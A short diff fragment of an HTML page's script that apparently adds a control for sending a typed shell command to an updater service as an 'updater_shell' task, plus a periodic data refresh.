+            const cmd = document.getElementById('shell-cmd').value.trim();
+            if (!cmd) { showToast('Enter a shell command', 'warning'); return; }
+            sendUpdaterTask('updater_shell', { command: cmd });
+        });
+
+        refreshData();
+        setInterval(() => { if (document.visibilityState === 'visible') refreshData(); }, 10000);
     </script>
 </body>
 </html>
